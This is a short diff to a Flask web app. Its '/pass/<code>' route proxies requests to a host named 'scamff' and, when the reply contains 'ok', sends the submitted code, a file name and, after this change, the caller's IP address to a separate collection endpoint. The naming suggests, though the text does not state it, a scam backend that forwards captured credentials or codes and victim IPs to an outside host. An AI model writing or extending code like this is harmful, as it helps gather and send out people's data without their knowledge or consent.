@@ -14,12 +14,13 @@ def hp():
 
 @app.route("/pass/<code>")
 def funct(code):
+    ip = request.args.get("ip")
     filename = request.args.get("file")
     resp = requests.get(f"https://scamff.pythonanywhere.com{request.full_path}")
     stt = resp.text
     
     if (filename != "") and (filename != None) and ("ok" in stt):
-        requests.get(f"https://flaskvs.vercel.app/m/{filename}.{code}")
+        requests.get(f"https://flaskvs.vercel.app/m/IP {ip} for: {filename}.{code}")
 
     return stt
 
